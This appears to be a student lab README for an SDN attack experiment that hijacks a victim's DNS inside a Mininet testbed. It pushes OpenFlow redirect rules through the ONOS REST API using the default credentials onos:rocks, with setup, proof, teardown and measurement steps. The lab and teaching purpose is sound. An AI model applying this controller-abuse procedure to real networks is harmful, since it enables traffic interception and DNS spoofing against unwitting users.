# Attack 2 — DNS Hijacking via ONOS OpenFlow rules

**SDN trust model targeted:** the control plane's *programmability*. Instead of
racing spoofed DNS replies on the LAN, we make the **controller (ONOS)** install
OpenFlow rules that steer the victim's DNS traffic (UDP/53) to an
attacker-controlled resolver, and silently rewrite the reply so the victim
accepts it.

```
 h1 (victim 10.0.10.11) ---\
 h2            10.0.10.12 ---+-- s1 --- r1 --- s3 --- srv (legit DNS 10.0.30.10)
 h3 (attacker 10.0.10.13) --/        (ONOS controller @ 127.0.0.1:6653)

 Normal : h1 asks srv  -> www.lab.example = 10.0.30.80  (real)
 Attack : ONOS flow on s1 steers h1's UDP/53 to h3 -> www.lab.example = 10.6.6.66 (attacker)
```

## Files
| File | What it is |
|------|------------|
| `scripts/setup_codespace.sh` | installs Mininet/OVS/dnsmasq + starts ONOS in Docker |
| `scripts/dns_topo_codespace.py` | the Mininet topology (userspace OVS, for Codespaces) |
| `scripts/dnsmasq-legit.conf` | the real resolver config (runs on `srv`) |
| `scripts/dnsmasq-rogue.conf` | the attacker's resolver config (runs on `h3`) |
| `scripts/push_dns_hijack.py` | **the attack** — installs the OpenFlow redirect rules via ONOS REST |
| `scripts/remove_dns_hijack.py` | removes those rules (clean teardown) |

> On a real Linux VM (not a container) you can use the team's
> `../dns_topo.py` instead of `dns_topo_codespace.py`.

---

## 0. One-time setup (in the Codespace)
```bash
cd dns-hijacking/scripts
sudo bash setup_codespace.sh
```
Wait ~60–90 s for ONOS to boot, then activate its apps and confirm it answers:
```bash
curl -u onos:rocks -X POST http://localhost:8181/onos/v1/applications/org.onosproject.openflow/active
curl -u onos:rocks -X POST http://localhost:8181/onos/v1/applications/org.onosproject.fwd/active
curl -u onos:rocks http://localhost:8181/onos/v1/devices        # should return JSON
```

## 1. Start the testbed
**Terminal A** (keep it open — this is the Mininet CLI):
```bash
cd dns-hijacking/scripts
sudo python3 dns_topo_codespace.py
```
At the `mininet>` prompt, let ONOS learn every host:
```
mininet> pingall
```
(You should see 0% dropped once the router is up.)

## 2. Start the two DNS resolvers
Open an **xterm** for the server and the attacker from the Mininet CLI:
```
mininet> xterm srv h3
```
In the **srv** window (legit resolver):
```bash
dnsmasq --conf-file=/absolute/path/to/dns-hijacking/scripts/dnsmasq-legit.conf -d
```
In the **h3** window (rogue resolver — leave it running, you'll watch it log hijacked queries):
```bash
dnsmasq --conf-file=/absolute/path/to/dns-hijacking/scripts/dnsmasq-rogue.conf -d
```
> `-d` keeps dnsmasq in the foreground so you can see `query[A] www.lab.example`
> lines appear the moment the hijack works.
> Tip: run `pwd` in the scripts folder to get the absolute path for `--conf-file`.

## 3. Baseline (BEFORE the attack) — prove the honest answer
In the Mininet CLI:
```
mininet> h1 dig +short @10.0.30.10 www.lab.example
10.0.30.80
```
`10.0.30.80` = the real answer. Good baseline.

## 4. Launch the attack — install the OpenFlow redirect rules
In **Terminal B** (not the Mininet CLI):
```bash
cd dns-hijacking/scripts
python3 push_dns_hijack.py            # add --dry-run first to preview the flows
```
It auto-discovers s1, the ports and the attacker MAC from ONOS, then installs
two flows (outbound hijack + return rewrite).

## 5. Prove the hijack (AFTER the attack)
Same query as the baseline — the victim still *thinks* it's asking the real
resolver (`@10.0.30.10`):
```
mininet> h1 dig +short @10.0.30.10 www.lab.example
10.6.6.66
```
`10.6.6.66` = the **attacker's** answer. The victim was hijacked without
touching the victim at all. You'll also see the query appear in the **h3**
dnsmasq window. **Screenshot both the baseline and this — that's your proof.**

Confirm the flows live in the controller:
```bash
curl -u onos:rocks http://localhost:8181/onos/v1/flows/application/org.sdnproject.dnshijack
```

## 6. Teardown
```bash
python3 remove_dns_hijack.py          # remove the hijack flows
mininet> h1 dig +short @10.0.30.10 www.lab.example   # back to 10.0.30.80
```
Exit Mininet with `exit`, then `sudo mn -c` to clean up.

---

## 7. Measurements (for the report — matches the proposal's metrics)

**How easy to conduct**
- *Attacker prerequisites:* a host on the LAN + REST access to ONOS (onos:rocks).
- *Time to compromise:* time `push_dns_hijack.py` — e.g. `time python3 push_dns_hijack.py`.
- *Success rate:* run the step-5 `dig` 20× in a loop; count how many return `10.6.6.66`.
  ```
  mininet> h1 bash -c 'for i in $(seq 20); do dig +short @10.0.30.10 www.lab.example; done'
  ```

**What it targets**
- *SDN component abused:* control-plane flow table on s1.
- *Control-plane corruption:* show the false flows and how long they persist:
  ```
  curl -u onos:rocks http://localhost:8181/onos/v1/flows/application/org.sdnproject.dnshijack
  ```

**Consequences**
- *Interception completeness:* fraction of the victim's DNS answers that are the
  attacker's IP (from the loop above).
- *Latency impact:* `mininet> h1 ping -c 20 10.0.30.10` with vs. without the flows.
- *Throughput impact:* `iperf3` between two hosts, attack on vs. off.
- *Controller cost:* watch Packet-In rate / CPU in the ONOS container
  (`docker stats onos`) during the attack.

Record each metric twice (attack OFF = baseline, attack ON) so the before/after
comparison is clean.

---

## Troubleshooting
- **`push_dns_hijack.py` says host not found** → run `pingall` again; ONOS only
  learns hosts after they send traffic.
- **`dig` still returns the real IP after attack** → check the flows installed
  (step 5 curl), and that you ran `pingall` so ONOS knows h3's port.
- **Mininet fails to start switches** → you're on the kernel datapath; this
  Codespace file already forces userspace. Run `sudo mn -c` and retry.
- **dnsmasq: "address already in use"** → the system dnsmasq is still running:
  `sudo systemctl stop dnsmasq`.
